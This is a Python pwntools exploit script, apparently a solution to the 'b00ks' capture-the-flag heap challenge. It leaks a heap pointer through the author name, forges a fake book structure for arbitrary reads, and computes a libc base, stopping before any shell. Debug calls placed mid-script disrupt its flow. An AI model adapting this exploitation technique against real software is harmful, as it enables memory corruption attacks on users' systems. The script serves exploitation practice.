
from pwn import *
#context(arch="amd64",os="linux",log_level="debug")
def name_1(p):
	p.recvuntil("Enter author name: ")
	p.sendline("a" * 0x20)
def change_name(p):
	p.recvuntil("> ")
	p.sendline("5")
	p.recvuntil("Enter author name: ")
	p.sendline("a" * 0x20)

def create_book(p,size,name,size_des,desc):
	p.recvuntil("> ")
	p.sendline("1")
	p.recvuntil("Enter book name size: ")
	p.sendline(str(size))
	p.recvuntil("Enter book name (Max 32 chars): ")
	p.sendline(str(name))
	p.recvuntil("Enter book description size: ")
	p.sendline(str(size_des))
	p.recvuntil("Enter book description: ")
	p.sendline(str(desc))
def change_des(p,id,des):
	p.recvuntil("> ")
	p.sendline("3")
	p.recvuntil("Enter the book id you want to edit: ")
	p.sendline(str(id))
	p.recv()
	p.sendline(str(des))

def print_book(p):
	p.recvuntil("> ")
	p.sendline("4")

def delete(p):
	p.recvuntil("> ")
	p.sendline("2")
	p.recvuntil("Enter the book id you want to delete: ")
	p.sendline("2")

p = process("./b00ks")

libc = ELF("b00ks").libc
name_1(p)
create_book(p,0x40,"aaaa",0x100,"bbbb")

create_book(p,0x21000,"cccc",0x21000,"dddd")
print_book(p)
gdb.attach(p)
p.interactive()
p.recvuntil("a" * 0x20)
book1_addr = u64(p.recv(6).ljust(8,"\x00"))
print(hex(book1_addr))
book2_name = book1_addr + 0x38
book2_des = book1_addr + 0x40
payload = p64(1) + p64(book2_des) + p64(book2_name) + p64(0xffff)
change_des(p,1,payload)
change_name(p)
print_book(p)

p.recvuntil("Name: ")
book2_des = u64(p.recv(6).ljust(8,"\x00"))
p.recvuntil("Description: ")
book2_name = u64(p.recv(6).ljust(8,"\x00"))

log.success("book2_name:" + hex(book2_name))
log.success("book2_des:" + hex(book2_des))

libc_base = book2_name - 0x389010

